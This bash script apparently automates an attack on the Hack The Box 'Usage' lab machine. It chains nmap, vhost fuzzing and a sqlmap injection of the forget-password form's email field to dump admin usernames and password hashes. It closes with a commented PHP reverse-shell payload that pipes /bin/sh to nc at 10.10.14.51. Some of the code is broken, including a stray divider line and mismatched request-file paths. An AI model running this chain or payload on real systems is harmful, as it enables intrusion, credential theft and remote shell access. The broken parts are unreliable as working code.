#!/bin/bash

#this script mainly works for Usage hack the box 

echo -n "Enter IP Address: "
read IP

echo $IP

echo "Executing Quick Nmap Scan..."
sudo nmap -sV -sC $IP  -Pn -oN ./output/nmap_$IP.txt 

# echo "`n Executing UDP/TCP Scan..."
# sudo nmap -sV -sC $IP -sSU -sS -Pn -oN ./output/nmap_udp_tcp_$IP.txt 

echo ""
echo "=================================="
echo "       Grabbing the domain.."
echo "=================================="
echo ""

# Check if port 80 is open
if grep -qE "80/tcp\s+open" "./output/nmap_$IP.txt"; then
    echo "Port 80 is open"
    http="`curl -iL  http://$IP`"

    # Extract the domain from the Location header
    domain=$(echo "$http" | grep -i "Location:" | awk -F'[/]' '{print $3}')

    # Check if domain is found
    if [ -n "$domain" ]; then
        echo "Domain Found!!!" | sed "s,Domain Found!!!,${SED_BLUE},"
        echo "Domain: $domain" | sed "s,Domain,${SED_BLUE},"
    else
        echo "Domain not found" | sed "s,Domain not found,${SED_RED_YELLOW},"
    fi
else
    echo "Port 80 is closed" | sed "s,Port 80 is closed,${SED_RED_YELLOW},"
fi

# Check if port 443 is open
if grep -qE "443/tcp\s+open" "./output/nmap_$IP.txt"; then
    echo "Port 443 is open"

    https="`curl -iL  https://$IP`"

    # Extract the domain from the Location header
    domain=$(echo "$https" | grep -i "Location:" | awk -F'[/]' '{print $3}')

    # Check if domain is found
    if [ -n "$domain" ]; then
        echo "Domain Found!!!" | sed "s,Domain Found!!!,${SED_BLUE},"
        echo "Domain: $domain" | sed "s,Domain,${SED_BLUE},"
    else
        echo "Domain not found" | sed "s,Domain not found,${SED_RED_YELLOW},"
    fi
else
    echo "Port 443 is closed" | sed "s,Port 80 is closed,${SED_RED_YELLOW},"
fi


if [ -n "$domain" ]; then
    echo ""
    echo "Adding IP and domain to /etc/hosts" | sed "s,Adding IP and domain to /etc/hosts,${SED_LIGHT_CYAN},"

    # Check if the IP address is already linked to the domain
    grep -q "$IP\s*$domain" "/etc/hosts"
    if [ $? -ne 0 ]; then
        # IP address not found for the domain, so add it
        echo "$IP      $domain" | sudo tee -a "/etc/hosts" >/dev/null
        echo "Added $IP      $domain to /etc/hosts" | sed "s,/etc/hosts,${SED_BLUE},"
    else
        echo "$IP is already linked to $domain in /etc/hosts" 
    fi
    echo ""
fi

echo ""
echo "=================================="
echo "  Checking subdomains and vhost.."
echo "=================================="
echo ""

if [ -n "$domain" ]; then
    gobuster dns -d $domain -w ./wordlist/subdomains.txt > ./output/subdomains_$IP.txt
else
    echo "No domain found try checking manually..."
fi


if [ -n "$domain" ]; then
    echo " Checking vhost"
    out="`cat ./wordlist/vhosts_test.txt | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://$IP -H "HOST: ${vhost}.$domain" | grep "Content-Length: ";done`"

    # Extract the value of Content-Length
    content_lengths=$(echo "$out" | grep "Content-Length" | awk '{print $2}')

    # Count the occurrences of Content-Length
    count=$(echo "$content_lengths" | wc -l)

    # Check if count is 3 or more
    if [ "$count" -ge 3 ]; then
        echo "This is a common length value: $(echo "$content_lengths" | head -n 1)"
    fi

    ffuf -w ./wordlist/subdomains.txt -u http://$IP -H "HOST: FUZZ.$domain" -fs $(echo "$content_lengths" | head -n 1 | awk '{print int($1)}') -o ./output/vhostRaw.json -of json
    
    echo "jq command not detected... Installing it"
    if ! command -v jq &> /dev/null; then
        sudo apt-get install -y jq
    fi

    # Extract hosts from the ffuf JSON output and save to a text file
    hosts=$(jq -r '.results[].host' "./output/vhostRaw.json")

    # Iterate through the hosts and print them to subdomains.txt
    for host in $hosts; do
    echo "$host"
    done > ./output/vhost_$IP.txt

    for vhost in $hosts;do
        # Check if the IP address is already linked to the domain
        grep -q "$IP\s*$vhost" "/etc/hosts"
        if [ $? -ne 0 ]; then
            # IP address not found for the domain, so add it
            echo "$IP      $vhost" | sudo tee -a "/etc/hosts" >/dev/null
            echo "Added $IP      $vhost to /etc/hosts" | sed "s,/etc/hosts,${SED_BLUE},"
        else
            echo "$IP is already linked to $vhost in /etc/hosts" 
        fi
    done
    echo "vhost are saved in the output folder!"
else
    echo "No domain found try checking manually..."
fi

======================EXECUTION============================================
echo ""
echo "===================================="
echo "Grabbing the webite headers"
echo "===================================="
echo ""

# URL of the page to scrape
URL="http://$domain/forget-password"
POST_URL="http://$domain/forget-password"

# Fetch the page and save the HTML and headers to variables
RESPONSE=$(curl -s -D - $URL)
HTML=$(echo "$RESPONSE" | sed -n '/^\r$/,$p')
HEADERS=$(echo "$RESPONSE" | sed '/^\r$/Q')

# Extract the hidden token value using grep and sed
TOKEN=$(echo "$HTML" | grep -oP '(?<=name="_token" value=")[^"]+')

# Extract and clean up cookies
COOKIES=$(echo "$HEADERS" | grep -i 'Set-Cookie:' | sed 's/Set-Cookie: //g' | sed 's/; expires=[^;]*//g' | sed 's/; Max-Age=[^;]*//g' | sed 's/; path=[^;]*//g' | sed 's/; h[^;]*//g' | sed 's/; tponly[^;]*//g' | sed 's/; samesite=[^;]*//g' | tr '\n' '; ' | sed 's/; $//')

# Define the email to be submitted
EMAIL="tester%40gmail.com"

# Define the data to be sent in the POST request
DATA="_token=$TOKEN&email=$EMAIL"


# Append the POST request headers and data
{
  echo -e "POST /forget-password HTTP/1.1"
  echo "Host: usage.htb"
  echo "Content-Length: ${#DATA}"
  echo "Cache-Control: max-age=0"
  echo "Upgrade-Insecure-Requests: 1"
  echo "Origin: http://usage.htb"
  echo "Content-Type: application/x-www-form-urlencoded"
  echo "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36"
  echo "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  echo "Referer: http://usage.htb/forget-password"
  echo "Accept-Encoding: gzip, deflate, br"
  echo "Accept-Language: en-US,en;q=0.9"
  echo "Cookie: $COOKIES"
  echo "Connection: close"
  echo -e "\n$DATA"
} > req.txt


#usage_blogs database was found early on by doing SQL MAP 
echo ""
echo "===================================="
echo "usage_blogs data base was found when running SQL map before. Now we are going to check for its content. Please wait..."
echo "===================================="
echo ""

sqlmap -r ./output/req.txt -p email --level 5 --risk 3 --batch --threads 10 -D usage_blog --tables

echo ""
echo "===================================="
echo "This will check the table admin_users. Please wait..."
echo "===================================="
echo ""

sqlmap -r ./output/req.txt -p email --level 5 --risk 3 --batch --threads 10 --dbms mysql -D usage_blog -T admin_users -C username,password,remember_token --dump > ./output/admin_creds.txt

echo "admin Credential is now available"
cat ./output/admin_creds.txt

echo ""
echo "===================================="
echo "Cracking the admin creds using John"
echo "===================================="
echo ""


#Payload
#<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 1234 >/tmp/f");?>

